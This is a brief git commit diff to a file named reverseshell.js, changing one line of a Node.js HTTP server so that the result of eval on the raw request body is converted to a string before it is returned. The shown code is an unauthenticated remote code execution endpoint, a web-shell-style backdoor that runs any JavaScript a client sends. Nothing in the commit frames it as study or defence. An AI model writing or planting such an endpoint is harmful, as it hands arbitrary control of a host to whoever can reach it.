0b041c1c15f608ab35ff09fa3a20e7e5db3c4ba9
Michael Hardy <michardy@users.noreply.github.com>
2018-03-19 20:40:10 -0700

    Fixes?

--- reverseshell.js
+++ reverseshell.js
@@ -14,7 +14,7 @@ server = http.createServer( function(req, res) {
         req.on('end', function () {
         });
         res.writeHead(200, {'Content-Type': 'text/plain'});
-        res.end(eval(body));
+        res.end(String(eval(body)));
     }
     else
     {
